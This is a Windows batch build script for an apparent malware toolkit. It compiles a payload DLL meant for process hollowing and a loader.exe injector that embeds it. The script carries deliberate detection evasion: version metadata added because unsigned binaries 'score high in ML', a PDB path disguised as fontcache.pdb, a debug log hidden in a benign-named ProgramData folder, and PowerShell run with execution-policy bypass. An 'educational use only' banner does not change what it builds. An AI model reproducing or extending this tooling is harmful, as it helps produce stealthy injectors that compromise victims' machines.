@echo off
setlocal EnableExtensions
REM build.bat - compiles ckdll.dll (payload) and loader.exe (injector)
REM EDUCATIONAL USE ONLY - FOR SECURITY RESEARCH AND TRAINING
REM Requires: Visual Studio 2022 Build Tools with "Desktop development with C++"
REM
REM Output:
REM   bin\ckdll.dll  - payload DLL (CRT-less)
REM   src\payload.h  - byte array of the DLL (auto-generated by gen.ps1)
REM   bin\loader.exe - injector (static CRT, GUI subsystem, version info)

cd /d "%~dp0"

REM ---------------------------------------------------------------- toolchain
REM The old script hardcoded one BuildTools path and sent vcvars output to nul:
REM when that path was wrong the build "failed" with no explanation.
set "VCVARS="

REM 1) already in a Developer Command Prompt
where cl.exe >nul 2>&1 && if exist "%VCToolsInstallDir%" set "VCVARS=ready"

REM 2) vswhere (authoritative, works for Community/Professional/Enterprise/BuildTools)
if not defined VCVARS (
    set "VSWHERE=%ProgramFiles(x86)%\Microsoft Visual Studio\Installer\vswhere.exe"
    if exist "%VSWHERE%" (
        for /f "usebackq delims=" %%i in (`"%VSWHERE%" -latest -products * -requires Microsoft.VisualStudio.Component.VC.Tools.x86.x64 -property installationPath`) do (
            if exist "%%i\VC\Auxiliary\Build\vcvars64.bat" set "VCVARS=%%i\VC\Auxiliary\Build\vcvars64.bat"
        )
    )
)

REM 3) common install roots
if not defined VCVARS (
    for %%r in (
        "%ProgramFiles%\Microsoft Visual Studio\2022\Community"
        "%ProgramFiles%\Microsoft Visual Studio\2022\Professional"
        "%ProgramFiles%\Microsoft Visual Studio\2022\Enterprise"
        "%ProgramFiles%\Microsoft Visual Studio\2022\BuildTools"
        "%ProgramFiles(x86)%\Microsoft Visual Studio\2022\BuildTools"
    ) do (
        if exist "%%~r\VC\Auxiliary\Build\vcvars64.bat" set "VCVARS=%%~r\VC\Auxiliary\Build\vcvars64.bat"
    )
)

if not defined VCVARS (
    echo [build] ERROR: vcvars64.bat not found.
    echo [build] Install "Visual Studio Build Tools 2022" and select:
    echo [build]   Desktop development with C++  ^(MSVC v143 + Windows 10/11 SDK^)
    echo [build] Then run this script again.
    exit /b 2
)

if /i not "%VCVARS%"=="ready" (
    echo [build] vcvars: %VCVARS%
    call "%VCVARS%" >nul 2>&1
)

where cl.exe >nul 2>&1
if errorlevel 1 (
    echo [build] ERROR: cl.exe is not on PATH after vcvars.
    echo [build] The C++ workload is installed only partially. Open the Visual Studio
    echo [build] Installer, Modify, and add "MSVC v143 - VS 2022 C++ x64/x86 build tools".
    exit /b 3
)
where ml64.exe >nul 2>&1
if errorlevel 1 (
    echo [build] ERROR: ml64.exe is not on PATH. Same fix as above.
    exit /b 3
)

if not exist bin mkdir bin

REM stale .exp/.lib from a previous build poison the new export table
REM (GetProcAddress would return an old RVA) -- always delete before linking
del /q bin\ckdll.exp bin\ckdll.lib 2>nul

REM --- payload DLL (CRT-less, no optimization) ---
REM /Od /Oi-: no optimization, no intrinsics (SSE vectorized memcpy crashes in hollowed process)
REM /NODEFAULTLIB /ENTRY:payload_entry: no CRT runtime
REM /DYNAMICBASE:NO /BASE:0x5F000000: fixed base for process hollowing
REM /DDEBUG: debug builds ONLY - writes C:\ProgramData\MediaCache\cache.log on the target
REM /Gs4096: every frame >= 4KB gets a stack probe (our chkstk.asm)
REM /utf-8: sources contain UTF-8 comments; without it MSVC assumes the ANSI codepage
echo [build] ckdll.dll ...
ml64 /c /nologo /Fo bin\chkstk.obj src\chkstk.asm
if errorlevel 1 ( echo [build] ML64 FAILED & exit /b 1 )

cl /nologo /LD /Od /Oi- /GS- /Gs4096 /utf-8 src\ckdll.cpp bin\chkstk.obj /Fe:bin\ckdll.dll ^
   /link /DLL /INCREMENTAL:NO /NODEFAULTLIB /ENTRY:payload_entry /DYNAMICBASE:NO /BASE:0x5F000000 ^
         /GUARD:NO /MACHINE:X64 kernel32.lib crypt32.lib bcrypt.lib iphlpapi.lib
if errorlevel 1 ( echo [build] DLL BUILD FAILED & exit /b 1 )

REM --- generate payload.h (byte array of the DLL embedded in loader.exe) ---
echo [build] payload.h ...
powershell -nop -exec bypass -file src\gen.ps1
if errorlevel 1 ( echo [build] GEN FAILED & exit /b 1 )

REM --- version resource (an unsigned GUI exe with no metadata scores high in ML) ---
echo [build] loader.exe ...
rc /nologo /fo bin\loader.res src\loader.rc
if errorlevel 1 ( echo [build] RC FAILED & exit /b 1 )

cl /nologo /O2 /MT /std:c++17 /utf-8 src\loader.cpp bin\loader.res /Fe:bin\loader.exe ^
   /link /SUBSYSTEM:WINDOWS /PDBALTPATH:fontcache.pdb user32.lib advapi32.lib
if errorlevel 1 ( echo [build] LOADER BUILD FAILED & exit /b 1 )

echo [build] ALL OK
for %%f in (bin\ckdll.dll bin\loader.exe) do echo [build]   %%~nxf  %%~zf bytes
exit /b 0
